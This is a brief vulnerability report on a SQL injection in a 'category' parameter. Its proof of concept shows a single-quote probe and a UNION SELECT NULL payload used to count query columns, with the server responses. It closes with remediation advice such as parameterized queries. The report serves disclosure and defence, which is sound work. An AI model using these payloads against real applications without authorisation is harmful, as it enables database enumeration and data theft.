# Vulnerability Report

## Title

SQL Injection - Determining Number of Columns

---

## Severity

High

---

## CWE

CWE-89

---

## OWASP

A03:2021 Injection

---

## Description

The application is vulnerable to SQL Injection through the category parameter.

An attacker can determine the number of columns returned by the original SQL query using UNION SELECT.

This information enables future data extraction attacks.

---

## Parameter

```
category
```

---

## Proof of Concept

Initial Injection

```sql
'
```

Returns

```
HTTP 500
```

Successful Payload

```sql
' UNION SELECT NULL,NULL,NULL--
```

Returns

```
HTTP 200 OK
```

---

## Risk

- Database Enumeration
- Information Disclosure
- Enables UNION Data Extraction

---

## Recommendation

- Prepared Statements
- Parameterized Queries
- Input Validation
- ORM Frameworks
- Principle of Least Privilege

---

## Verification

Successfully reproduced.

Status

✅ Confirmed